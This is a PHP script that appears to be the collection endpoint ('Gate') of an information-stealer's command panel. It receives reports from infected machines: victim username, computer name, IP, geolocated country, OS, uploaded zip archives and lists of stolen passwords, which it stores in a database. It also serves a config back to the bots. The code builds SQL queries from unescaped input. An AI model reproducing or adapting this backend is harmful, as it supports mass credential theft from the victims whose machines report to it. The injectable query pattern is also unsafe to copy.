<?php
header ("Connection: close");
	include_once "config.php";
	include_once "functions.php";
	include_once("modules/tabgeo_country_v4/tabgeo_country_v4.php");
	
	if (@$_POST['getconfig']=='1') {
		$mid = @$_POST['mid'];
		$link = mysql_connect($database_host, $database_user, $database_pass) or die('No connect: ' . mysql_error());
		mysql_select_db($database_name) or die('No database');
		$count=0;
		$count=mysql_fetch_array(mysql_query("SELECT COUNT(1) FROM reports WHERE machine_id = '$mid'"))[0];
		mysql_close($link);
		
		$str="";
		//echo "mid $mid \n\r";
		//echo "count $count \n\r";
		$cf = FileToString('./cfg.txt');
		if (($count>0) and(pars($cf, "IS_G_DOUBLE: ", "\r\n")=="0")) $str="_NO_WORK_EXIT_"; 
		die($cf.$str);
	};
	
	if (@$_POST['sendreport']!='1') {
		die('Gate');
	};
	
	
	date_default_timezone_set("GMT");
	$datetime = date("Y-m-d_H-i-s");
	$ip = $_SERVER['REMOTE_ADDR'];
	@$isocode =  tabgeo_country_v4($ip);
	if (@$isocode == "") @$isocode = "AA";
	
	//var_dump($_FILES);
	//var_dump($_POST);

	$mid 	=	@$_POST['mid'];
	$user	=	iconv('cp1251', 'utf-8', @$_POST['user']);
	$comp	=	iconv('cp1251', 'utf-8', @$_POST['comp']);
	$win	=	@$_POST['win'];
	
	$filename = $datetime.'_'.$mid.".zip";
	
	move_uploaded_file(@$_FILES['userfile']['tmp_name'], "./files/$filename");
	$link = mysql_connect($database_host, $database_user, $database_pass) or die('No connect: ' . mysql_error());
	mysql_select_db($database_name) or die('No database');
	
	$newid = mysql_result(mysql_query("SELECT MAX(id) FROM reports"), 0) + 1;
	mysql_query("INSERT INTO `reports` (id, date, username, compname, ip, country, os, machine_id, file) VALUES('$newid', '$datetime','$user', '$comp', '$ip', '$isocode', '$win', '$mid', '$filename')");
	
	@$pwdata=@$_POST['pwdata'];
	$pwdlist = explode("\r\n", $pwdata);
	foreach ($pwdlist as &$value) {
		$line = explode("|",$value);
		$soft_type	= mysql_real_escape_string(urldecode(@$line[0]));
		$soft_name	= mysql_real_escape_string(urldecode(@$line[1]));
		$p1 		= mysql_real_escape_string(urldecode(@$line[2]));
		$p2			= mysql_real_escape_string(urldecode(@$line[3]));
		$p3			= mysql_real_escape_string(urldecode(@$line[4]));
		$p4			= mysql_real_escape_string(urldecode(@$line[5]));
		//echo $soft_type."\r\n".$soft_name."\r\n".$p1 ."\r\n".$p2."\r\n".$p3	."\r\n".$p4	."\r\n"."\r\n";
		$result = mysql_query("INSERT INTO `passwords` (soft_type, soft_name,report_id, p1, p2, p3, p4) VALUES('$soft_type', '$soft_name','$newid', '$p1', '$p2', '$p3', '$p4')");
	}
	mysql_close($link);



//var_dump($data);

?>